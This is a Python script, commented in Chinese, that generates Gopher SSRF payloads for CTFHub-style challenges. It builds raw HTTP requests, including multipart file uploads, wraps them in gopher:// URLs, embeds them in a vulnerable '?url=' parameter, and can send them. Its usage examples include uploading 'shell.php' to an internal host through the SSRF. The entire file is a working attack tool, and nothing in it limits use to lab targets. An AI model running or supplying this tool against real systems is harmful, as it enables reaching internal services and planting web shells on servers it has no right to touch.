#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Gopher SSRF Tool - 用于 CTFHub 类自定义 HTTP 请求的 Gopher Payload 生成器
支持：GET / POST / 文件上传 / 自定义 Header / 双重 URL 编码
"""

import urllib.parse
import urllib.request
import argparse
import sys
import os
import mimetypes


def build_gopher_http_payload(method, path, host, port, headers, body):
    """
    构造原始 HTTP 报文
    """
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}:{port}"]

    for key, value in headers.items():
        lines.append(f"{key}: {value}")

    if body is not None:
        content_length = len(body.encode("utf-8")) if isinstance(body, str) else len(body)
        lines.append(f"Content-Length: {content_length}")

    lines.append("")  # 空行

    if body is not None:
        lines.append(body)

    return "\r\n".join(lines) + "\r\n"


def double_encode_gopher(http_payload, host, port):
    """
    双重 URL 编码生成最终 Gopher URL
    """
    gopher = f"gopher://{host}:{port}/_" + urllib.parse.quote(http_payload)
    return gopher


def build_ssrf_url(gopher_url, target_base):
    """
    将 Gopher URL 嵌入到 SSRF 入口的 ?url= 参数中
    """
    if not target_base.endswith("="):
        target_base = target_base.rstrip("/") + "/?url="
    return target_base + urllib.parse.quote(gopher_url, safe="")


def send_request(url, timeout=15):
    """
    发送 HTTP 请求并返回响应
    """
    req = urllib.request.Request(
        url,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", errors="ignore")


def build_multipart_body(fields, files, boundary="----WebKitFormBoundary7MA4YWxk"):
    """
    构造 multipart/form-data body
    fields: dict {name: value}
    files:  dict {field_name: (filename, file_content_bytes)}
    """
    parts = []
    for name, value in fields.items():
        parts.append(f"--{boundary}")
        parts.append(f'Content-Disposition: form-data; name="{name}"')
        parts.append("")
        parts.append(value)

    for name, (filename, content) in files.items():
        content_type = mimetypes.guess_type(filename)[0] or "application/octet-stream"
        parts.append(f"--{boundary}")
        parts.append(f'Content-Disposition: form-data; name="{name}"; filename="{filename}"')
        parts.append(f"Content-Type: {content_type}")
        parts.append("")
        if isinstance(content, str):
            parts.append(content)
        else:
            parts.append(content.decode("latin-1"))  # 二进制内容用 latin-1 保持字节

    parts.append(f"--{boundary}--")
    parts.append("")

    return "\r\n".join(parts)


def print_section(title, content=""):
    print("=" * 60)
    print(f"[+] {title}")
    print("=" * 60)
    if content:
        print(content)
        print()


def main():
    parser = argparse.ArgumentParser(
        description="Gopher SSRF Tool - 自定义 HTTP 请求 Payload 生成器",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例:
  # 1. GET 请求
  python3 gopher_tool.py -u "http://target.com/?url=" --host 127.0.0.1 --port 80 --path /flag.php

  # 2. POST 提交 key
  python3 gopher_tool.py -u "http://target.com/?url=" --method POST --path /flag.php \\
      -H "Content-Type: application/x-www-form-urlencoded" --body "key=abcdef"

  # 3. 文件上传
  python3 gopher_tool.py -u "http://target.com/?url=" --method POST --path /flag.php \\
      -F "file=@shell.php" -H "Content-Type: multipart/form-data"

  # 4. 直接发送请求获取响应
  python3 gopher_tool.py ... --request
        """,
    )

    parser.add_argument("-u", "--url", required=True, help="SSRF 入口 URL (如 http://target.com/?url=)")
    parser.add_argument("--host", default="127.0.0.1", help="内网目标主机 (默认: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="内网目标端口 (默认: 80)")
    parser.add_argument("--method", default="GET", help="HTTP 方法 (默认: GET)")
    parser.add_argument("--path", default="/", help="请求路径 (默认: /)")
    parser.add_argument(
        "-H", "--header", action="append", default=[], help="自定义 Header，格式 'Key: Value'，可多次使用"
    )
    parser.add_argument("--body", help="请求 Body (字符串)")
    parser.add_argument(
        "-F", "--form", action="append", default=[], help="multipart 表单字段，格式 'name=value' 或 'name=@filename'"
    )
    parser.add_argument("-r", "--request", action="store_true", help="发送请求并打印响应")
    parser.add_argument("--timeout", type=int, default=15, help="请求超时 (默认: 15s)")

    args = parser.parse_args()

    # 解析 headers
    headers = {}
    is_multipart = False
    for h in args.header:
        if ":" not in h:
            print(f"[-] Header 格式错误: {h}")
            sys.exit(1)
        key, value = h.split(":", 1)
        headers[key.strip()] = value.strip()
        if "multipart/form-data" in value:
            is_multipart = True

    # 解析 body / multipart
    body = args.body
    if args.form:
        is_multipart = True
        fields = {}
        files = {}
        for f in args.form:
            if "=" not in f:
                print(f"[-] Form 格式错误: {f}")
                sys.exit(1)
            name, value = f.split("=", 1)
            if value.startswith("@"):
                filepath = value[1:]
                if not os.path.exists(filepath):
                    print(f"[-] 文件不存在: {filepath}")
                    sys.exit(1)
                with open(filepath, "rb") as fp:
                    files[name] = (os.path.basename(filepath), fp.read())
            else:
                fields[name] = value

        boundary = "----WebKitFormBoundary7MA4YWxk"
        body = build_multipart_body(fields, files, boundary)
        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

    # 如果是 POST 但没有 Content-Type，默认设置
    if args.method.upper() == "POST" and "Content-Type" not in headers and body:
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    # 构造 HTTP 报文
    http_payload = build_gopher_http_payload(
        args.method.upper(), args.path, args.host, args.port, headers, body
    )

    print_section("原始 HTTP 报文", http_payload)

    # 第一次编码
    gopher_url = double_encode_gopher(http_payload, args.host, args.port)
    print_section("Gopher URL（第一次编码）", gopher_url)

    # 第二次编码
    final_url = build_ssrf_url(gopher_url, args.url)
    print_section("最终攻击 URL（双重编码）", final_url)

    # 发送请求
    if args.request:
        print_section("发送请求...")
        try:
            response = send_request(final_url, args.timeout)
            print(response)
        except Exception as e:
            print(f"[-] 请求失败: {e}")


if __name__ == "__main__":
    main()
